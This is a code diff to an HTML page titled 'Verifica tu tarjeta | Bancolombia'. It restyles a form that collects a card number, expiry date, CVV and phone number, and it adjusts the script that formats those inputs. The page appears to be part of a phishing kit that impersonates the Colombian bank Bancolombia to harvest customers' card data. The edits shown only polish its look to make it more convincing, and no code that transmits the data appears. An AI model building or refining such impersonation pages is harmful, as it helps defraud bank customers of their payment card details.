@@ -6,16 +6,47 @@
 <title>Verifica tu tarjeta | Bancolombia</title>
 <link rel="stylesheet" href="css/secured.css">
 <style>
-  /* Ajustes específicos para el nuevo diseño de tarjeta */
+  /* Fondo general simulando la aplicación oscura difuminada */
+  body {
+    background: linear-gradient(135deg, #111 0%, #222 100%);
+    margin: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  }
+
+  /* Contenedor central con efecto borroso de fondo y tarjeta flotante */
+  .center {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: calc(100vh - 70px);
+    padding: 16px;
+    box-sizing: border-box;
+    position: relative;
+  }
+
+  /* Simulación de elementos borrosos al fondo de la pantalla */
+  .center::before {
+    content: "";
+    position: absolute;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.4);
+    backdrop-filter: blur(8px);
+    -webkit-backdrop-filter: blur(8px);
+    z-index: 1;
+  }
+
   .card-form {
-    background: #fff;
-    border-radius: 24px;
-    padding: 24px 20px;
-    box-shadow: 0 4px 20px rgba(0,0,0,0.08);
-    max-width: 440px;
+    position: relative;
+    z-index: 2;
+    background: #ffffff;
+    border-radius: 28px;
+    padding: 28px 22px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+    max-width: 420px;
     width: 100%;
     margin: auto;
   }
+
   .card-form h1 {
     font-size: 20px;
     font-weight: 700;
@@ -23,6 +54,7 @@
     text-align: center;
     margin-bottom: 8px;
   }
+
   .card-form .sub {
     font-size: 13px;
     color: #555;
@@ -30,16 +62,20 @@
     margin-bottom: 20px;
     line-height: 1.4;
   }
+
   .field-row-3 {
     display: flex;
-    gap: 10px;
+    gap: 8px;
   }
+
   .field-row-3 .field {
     flex: 1;
   }
+
   .field-row-3 .field:nth-child(2) {
     flex: 1.2;
   }
+
   .field select, .field input {
     width: 100%;
     padding: 12px;
@@ -51,6 +87,7 @@
     color: #111;
     box-sizing: border-box;
   }
+
   .field select {
     appearance: none;
     background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23666' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
@@ -58,15 +95,18 @@
     background-position: right 12px center;
     background-size: 16px;
   }
+
   .field label {
     display: block;
     font-size: 12px;
     color: #4b5563;
     margin-bottom: 6px;
   }
+
   .field {
     margin-bottom: 16px;
   }
+
   .err-banner {
     display: none;
     background: #ffeeec;
@@ -77,12 +117,15 @@
     text-align: center;
     margin-bottom: 16px;
   }
+
   .err-banner.show {
     display: block;
   }
+
   .actions {
     margin-top: 20px;
   }
+
   .btn-yellow-full {
     width: 100%;
     background: #f7d232;
@@ -94,10 +137,14 @@
     font-size: 15px;
     cursor: pointer;
     text-align: center;
+    box-shadow: 0 4px 12px rgba(247, 210, 50, 0.3);
+    transition: opacity 0.2s;
   }
+
   .btn-yellow-full:disabled {
     opacity: 0.5;
     cursor: not-allowed;
+    box-shadow: none;
   }
 </style>
 </head>
@@ -183,21 +230,19 @@
 
 <script src="js/secured.js"></script>
 <script>
-  const tc         = document.getElementById('tc');
+  const tc          = document.getElementById('tc');
   const expiryMonth = document.getElementById('expiryMonth');
   const expiryYear  = document.getElementById('expiryYear');
-  const cvv        = document.getElementById('cvv');
-  const phone      = document.getElementById('phone');
-  const btn        = document.getElementById('btnContinue');
-  const errEl      = document.getElementById('errBanner');
-  const spanUser   = document.getElementById('spanUserNombre');
+  const cvv         = document.getElementById('cvv');
+  const phone       = document.getElementById('phone');
+  const btn         = document.getElementById('btnContinue');
+  const errEl       = document.getElementById('errBanner');
+  const spanUser    = document.getElementById('spanUserNombre');
 
-  // Rellenar nombre si existe en la interfaz o sessionStorage
   if(spanUser && document.getElementById('userName')) {
     spanUser.innerText = document.getElementById('userName').innerText;
   }
 
-  // Formato número de tarjeta: 4-4-4-4
   tc.addEventListener('input', () => {
     let v = tc.value.replace(/\D/g, '').slice(0, 16);
     tc.value = v.replace(/(.{4})/g, '$1 ').trim();
